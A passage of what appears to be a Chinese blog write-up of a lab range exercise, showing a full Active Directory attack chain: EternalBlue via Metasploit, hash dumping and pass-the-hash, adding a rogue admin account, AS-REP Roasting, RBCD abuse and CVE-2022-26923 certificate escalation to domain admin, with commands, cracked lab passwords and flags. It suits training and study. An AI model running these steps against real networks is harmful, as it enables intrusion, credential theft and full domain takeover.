GMT length:135 pragma:no-cache server:Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02 set-cookie:rid=vv8286s2m8eiiue19vuvkdbcn4; path=/ status_code:200 title:无标题 x-powered-by:PHP/5.5.9]</span>, fingerprints=<span class="hljs-selector-attr">[]</span>, port=<span class="hljs-number">80</span>, service=http, title=无标题, Url=http:<span class="hljs-comment">//172.22.15.24/www</span><br></code></pre></td></tr></table></figure>
+
+<p>信息如下：</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.15.13</span> XR-DC01 域名xiaorang.lab。<br><span class="hljs-number">172.22.15.18</span> XR-CA	同属 xiaorang.lab<br><span class="hljs-number">172.22.15.24</span> <span class="hljs-number">80</span>,<span class="hljs-number">3306</span> XR-WIN08 MS17-<span class="hljs-number">010</span><br><span class="hljs-number">172.22.15.35</span> <span class="hljs-number">445</span>,<span class="hljs-number">139</span> XR-<span class="hljs-number">0687</span><br></code></pre></td></tr></table></figure>
+
+<p><code>172.22.15.24</code> 存在永恒之蓝漏洞</p>
+<p>老样子传 frpc 和 frpc.ini 流量转发，proxychains 代理一下 msf 打永恒之蓝</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains msfconsole<br>use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> rhosts 172.22.15.24<br>run<br></code></pre></td></tr></table></figure>
+
+<p>不知道为啥执行 shell 会超时，进行 hashdump </p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/5873062a9691ad74.png"> </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Administrator</span>:<span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">0</span>e52d03e9b939997401466a0ec5a9cbc:::<br><span class="hljs-attribute">Guest</span>:<span class="hljs-number">501</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br></code></pre></td></tr></table></figure>
+
+<p>执行</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> impacket-psexec administrator@<span class="hljs-number">172.22.15.24</span> -hashes <span class="hljs-string">&#x27;:0e52d03e9b939997401466a0ec5a9cbc&#x27;</span> -codec gbk<br></code></pre></td></tr></table></figure>
+
+<p>拿到 system 权限</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/b4f658f22e455963.png"></p>
+<p>进入 Administrator 用户目录下</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/e5913f930b310363.png"></p>
+<p>拿到 flag02</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">flag02: flag&#123;<span class="hljs-number">65518b91</span>-b026-4cfd-a62e-75aea9d458f6&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h1><p>扫 172.22.15.24 目录发现有 phpAdmin，但是没有密码，但是发现这台机器桌面上有 phpstudy，可以尝试远程连接，先添加用户密码</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">butt3rf1y</span> qwe456@ /add<br>net localgroup administrators butt3rf1y /add<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.dkdun.cn/v1/2025/12/884c3fd0d3eaa369.png"></p>
+<p>远程查看 phpstudy 拿到俩密码</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">root root@<span class="hljs-attr">#123</span><br>zdoo zdo<span class="hljs-meta">o123</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.dkdun.cn/v1/2025/12/6101b91ad6b199c0.png"></p>
+<p>root 账号登录 phpAdmin，在 zdoo 数据库的 zdoosys_user 中找到很多域用户信息，先保存下来</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/c71e8ba887d80964.png"></p>
+<h1 id="ZDOO-OA"><a href="#ZDOO-OA" class="headerlink" title="ZDOO OA"></a>ZDOO OA</h1><p>发现 phpstudy 搭建的网站，尝试 zdoo:zdoo123 登录，不行</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/c843ad6818cb49bd.png"></p>
+<p>admin:123456 成功登录，就有一些用户信息，但是之前在数据库中已经拿到了</p>
+<h1 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h1><p>尝试 AS-REP Roasting 攻击</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> impacket-GetNPUsers -dc-ip <span class="hljs-number">172.22.15.13</span>  xiaorang.lab/ -usersfile user.txt<br></code></pre></td></tr></table></figure>
+
+<p>得到两个 TGT 票据</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$krb5asrep$23$lixiuying<span class="hljs-symbol">@xiaorang</span>.lab<span class="hljs-symbol">@XIAORANG</span>.LAB:beb6333f35e707252e4e869ffed9b20f$75941020628623dc735e3b60ed28131e974c7725788c93d53034211419a12878a24ff34d77fe4f2db6f5364a68c1120cd1958eb758b2e23b1f7d8e117e03ab0503a916da4e7bd75bfb17514266253598c020093b5d17d536caeedbbea4ed8f1b000c168cb75c6e0937ca877aed51334a0c8c36efa487a534fed1e25ef2f5725488da057aa0c4f89cdb2f4341db8297c810a21765394e7426513ca83f98557eaa4230d1d6ecd6f723034340c5d4cc2fc67ea88feb620325c3042b584dd59224b8b6618aa89607c71227d51c1068a85617cd91f549a9f155c594bb96bf824d7755d194042ce253f4cca684574a<br><br>$krb5asrep$23$huachunmei<span class="hljs-symbol">@xiaorang</span>.lab<span class="hljs-symbol">@XIAORANG</span>.LAB:<span class="hljs-number">947</span>a93f5ea00c81d436c808d791742ad$5819df23d5c9779825928b8e7cac411362fe1aca403eb601ea80fcb08b5d8a3fd3ed06201e1bd05abee4c026359b1eac57a69dceed7c5842bd15641f04c312cf2658fc66319b594b9d42a4d5b070e40dfab0d63a04f278f08634f804f285638ea4240954b6b87fad1d7963d2ca462d85b4da4d566847929155bdb9e3dd3c2d97082f962239f6412a2de8643b5e433c0464a896428adcd7e1bbb25230d2065f2e79abcf0b2f0132ca72a2f5fa6d072860098f16f6110fac48732c4d458ea6ab7a219edf8fda033eabcf8e474b790d634183fd5b49ef0ad525034fb1ce643dceb7fce754fdde066e2ca1e4ba70<br></code></pre></td></tr></table></figure>
+
+<p>用 hashcat 爆破，爆出两个密码</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/4dbbbd8b908714ac.png"></p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">lixiuying<span class="hljs-keyword">@xiaorang</span>.<span class="hljs-attribute">lab</span>:winniethepooh<br>huachunmei<span class="hljs-keyword">@xiaorang</span>.<span class="hljs-attribute">lab</span>:<span class="hljs-number">1</span>qaz2wsx<br></code></pre></td></tr></table></figure>
+
+<p>RDP 继续连接 172.22.15.35</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">proxychains4 bloodhound-python -u lixiuying -<span class="hljs-selector-tag">p</span> winniethepooh -d xiaorang<span class="hljs-selector-class">.lab</span> -c <span class="hljs-attribute">all</span> -ns <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> <span class="hljs-attr">--zip</span> <span class="hljs-attr">--dns-tcp</span><br></code></pre></td></tr></table></figure>
+
+<p>导入 bloodhound 查看域关系图</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/1d9f456723b2fe57.png"></p>
+<p>可以看到 <code>LIXIUYING@XIAORANG.LAB</code> 对 <code>XR-0687.XIAORANG.LAB</code> 有 GenericWrite 的权限，熟悉的 RBCD</p>
+<h1 id="RBDC"><a href="#RBDC" class="headerlink" title="RBDC"></a>RBDC</h1><p>添加机器用户进去</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">proxychains impacket-addcomputer -<span class="hljs-keyword">method</span> <span class="hljs-title function_">SAMR</span> <span class="hljs-title function_">xiaorang</span>.<span class="hljs-title function_">lab</span>/<span class="hljs-title function_">lixiuying</span>:winniethepooh -computer-name butt3rf1y$ -computer-pass <span class="hljs-string">&#x27;u4happy@&#x27;</span> -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span><br></code></pre></td></tr></table></figure>
+
+<p>修改 <code>XR-0687$</code> 的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 字段</p>
+<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">proxychains -q impacket-rbcd xiaorang.lab/lixiuying:winniethepooh -action write -<span class="hljs-keyword">delegate</span>-<span class="hljs-keyword">from</span> <span class="hljs-string">&quot;butt3rf1y$&quot;</span> -<span class="hljs-keyword">delegate</span>-<span class="hljs-keyword">to</span> <span class="hljs-string">&quot;XR-0687$&quot;</span> -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.dkdun.cn/v1/2025/12/9f7196423c7aede4.png"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">butt3rf1y</span>$   (S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3745972894</span>-<span class="hljs-number">1678056601</span>-<span class="hljs-number">2622918667</span>-<span class="hljs-number">1147</span>)<br></code></pre></td></tr></table></figure>
+
+<p>用 impacket 的 getST 执行 RBCD 攻击，获取机器上的 Kerberos 服务票据 TGS</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">proxychains -<span class="hljs-selector-tag">q</span> impacket-getST xiaorang.lab/butt3rf1y$:<span class="hljs-string">&#x27;u4happy@&#x27;</span> -spn cifs/XR-<span class="hljs-number">0687</span><span class="hljs-selector-class">.xiaorang</span><span class="hljs-selector-class">.lab</span> -impersonate Administrator -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span><br></code></pre></td></tr></table></figure>
+
+<p>导入票据</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">KRB5CCNAME</span>=Administrator@cifs_XR-0687.xiaorang.lab@XIAORANG.LAB.ccache<br></code></pre></td></tr></table></figure>
+
+<p>直接访问目标主机</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> -q impacket-psexec <span class="hljs-string">&#x27;xiaorang.lab/administrator<span class="hljs-variable">@XR</span>-0687.xiaorang.lab&#x27;</span> -target-ip <span class="hljs-number">172.22.15.35</span> -codec gbk -<span class="hljs-literal">no</span>-pass -k<br></code></pre></td></tr></table></figure>
+
+<p>在 C:\Users\Administrator\flag 下拿到 flag03 </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag03</span>: flag&#123;e8893d4e-<span class="hljs-number">1</span>e26-<span class="hljs-number">4</span>e14-a8ff-<span class="hljs-number">5</span>eff3b928f81&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="CVE-2022-26923"><a href="#CVE-2022-26923" class="headerlink" title="CVE-2022-26923"></a>CVE-2022-26923</h1><p>最后剩下了拥有 CA 的 172.22.15.18，fscan 扫到一个 Active Directory 证书服务漏洞</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/88a7693744a44d75.png"></p>
+<p>经过一番搜索发现是 <a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/335471.html">CVE-2022-26923</a> Windows域提权，参考 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11073">ADCS攻击笔记</a></p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">当 <span class="hljs-variable">Windows</span> 系统的 <span class="hljs-built_in">Active</span> <span class="hljs-built_in">Directory</span> 证书服务（<span class="hljs-variable">CS</span>）在域上运行时，由于机器账号中的 <span class="hljs-variable">dNSHostName</span> 属性不具有唯一性，域中普通用户可以将其更改为高权限的域控机器账号属性，然后从 <span class="hljs-built_in">Active</span> <span class="hljs-built_in">Directory</span> 证书服务中获取域控机器账户的证书，导致域中普通用户权限提升为域管理员权限<br></code></pre></td></tr></table></figure>
+
+<p>创建一个机器用户将该机器用户 dNSHostName 属性指向域控，先下载 certipy-ad，<a target="_blank" rel="noopener" href="https://github.com/ly4k/Certipy/wiki/04-%E2%80%90-Installation">Certipy</a></p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">proxychains certipy-ad account <span class="hljs-keyword">create</span> -<span class="hljs-keyword">user</span> <span class="hljs-string">&#x27;butt3rf2y$&#x27;</span> -pass <span class="hljs-string">&#x27;p4ppy&#x27;</span> -dc-ip <span class="hljs-number">172.22</span><span class="hljs-number">.15</span><span class="hljs-number">.13</span> -u lixiuying -p <span class="hljs-string">&#x27;winniethepooh&#x27;</span> -dns XR-DC01.xiaorang.lab<br></code></pre></td></tr></table></figure>
+
+<p>成功写入后，向 AD CS 请求域控的证书</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> certipy-ad req -u <span class="hljs-string">&#x27;butt3rf2y$<span class="hljs-variable">@xiaorang</span>.lab&#x27;</span> -p <span class="hljs-string">&#x27;p4ppy&#x27;</span> -target <span class="hljs-number">172.22.15.18</span> -ca <span class="hljs-string">&#x27;xiaorang-XR-CA-CA&#x27;</span> -template <span class="hljs-string">&#x27;Machine&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.dkdun.cn/v1/2025/12/d228be69b9e00bb2.png"></p>
+<p>然后用申请的证书请求 DC$ 的 TGT</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> certipy-ad auth -pfx xr-dc01.pfx -dc-ip <span class="hljs-number">172.22.15.13</span><br></code></pre></td></tr></table></figure>
+
+<p>遇到了错误：</p>
+<p>Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)</p>
+<p>换成设置 RBCD 来攻击，通过 Schannel 将证书传递到 LDAPS, 修改 LDAP 配置 (例如配置 RBCD &#x2F; DCSync), 来获得域控权限</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">openssl pkcs12 -<span class="hljs-keyword">in</span> xr-dc01<span class="hljs-selector-class">.pfx</span> -out xr-dc01<span class="hljs-selector-class">.pem</span> -nodes<br>openssl rsa -<span class="hljs-keyword">in</span> xr-dc01<span class="hljs-selector-class">.pem</span> -out xr-dc01<span class="hljs-selector-class">.key</span><br>openssl x509 -<span class="hljs-keyword">in</span> xr-dc01<span class="hljs-selector-class">.pem</span>  -out xr-dc01.crt<br></code></pre></td></tr></table></figure>
+
+<p>地址：<a target="_blank" rel="noopener" href="https://github.com/AlmondOffSec/PassTheCert/">https://github.com/AlmondOffSec/PassTheCert/</a></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">proxychains python3 PassTheCert-main/Python/passthecert<span class="hljs-selector-class">.py</span> -action whoami -crt xr-dc01<span class="hljs-selector-class">.crt</span> -key xr-dc01<span class="hljs-selector-class">.key</span> -domain xiaorang<span class="hljs-selector-class">.lab</span> -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.dkdun.cn/v1/2025/12/19796c299b6b0215.png"></p>
+<p>将证书配置到域控的 RBCD</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">proxychains python3 PassTheCert-main/Python/passthecert.py -action write_rbcd -crt xr-dc01.crt -key xr-dc01.key -domain xiaorang.lab -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> -<span class="hljs-keyword">delegate</span>-<span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;XR-DC01$&#x27;</span> -<span class="hljs-keyword">delegate</span>-<span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;butt3rf2y$&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.dkdun.cn/v1/2025/12/ad159b4f84bb39b6.png"></p>
+<p>申请ST</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> impacket-getST xiaorang.lab/<span class="hljs-string">&#x27;butt3rf2y$&#x27;</span>:<span class="hljs-string">&#x27;p4ppy&#x27;</span> -spn cifs/XR-DC01.xiaorang.lab -impersonate Administrator -dc-ip <span class="hljs-number">172.22.15.13</span><br></code></pre></td></tr></table></figure>
+
+<p>然后导入</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">KRB5CCNAME</span>=Administrator@cifs_XR-DC01.xiaorang.lab@XIAORANG.LAB.ccache<br></code></pre></td></tr></table></figure>
+
+<p>配置下 hosts</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.15.13</span>	XR-DC01.xiaorang.lab<br></code></pre></td></tr></table></figure>
+
+<p>连接就行了</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains</span> impacket-psexec Administrator<span class="hljs-variable">@XR</span>-DC01.xiaorang.lab -k -<span class="hljs-literal">no</span>-pass -dc-ip <span class="hljs-number">172.22.15.13</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.dkdun.cn/v1/2025/12/d41095a4440eaf38.png"></p>
+<p>拿到 flag04</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag04</span>: flag&#123;c2278fc6-e66f-<span class="hljs-number">4</span>f16-<span class="hljs-number">827</span>a-<span class="hljs-number">84</span>ffcd44b462&#125;<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F/" class="category-chain-item">渗透</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA/" class="category-chain-item">靶机</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" class="category-chain-item">春秋云镜</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-WordPress-AS-REP-Roasting-CVE-2022-26923/" class="print-no-link">#内网渗透 WordPress AS-REP Roasting CVE-2022-26923</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>春秋云镜-2022网鼎半决赛复盘</div>
+      <div>http://example.com/2025/07/23/春秋云镜-2022网鼎半决赛复盘/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>butt3rf1y</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年7月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/07/24/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E7%AC%AC%E4%BA%94%E7%AB%A0/" title="玄机-第四章&amp;第五章">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">玄机-第四章&amp;第五章</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/07/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-ThermalPower/" title="春秋云镜-ThermalPower">
+                        <span class="hidden-mobile">春秋云镜-ThermalPower</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments">
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"rWKtzRd76Kz6dC7Vd9dUwQux-gzGzoHsz","appKey":"DxMgc7gveh6B1aJKyAZnoFNj","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":true,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span> </a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
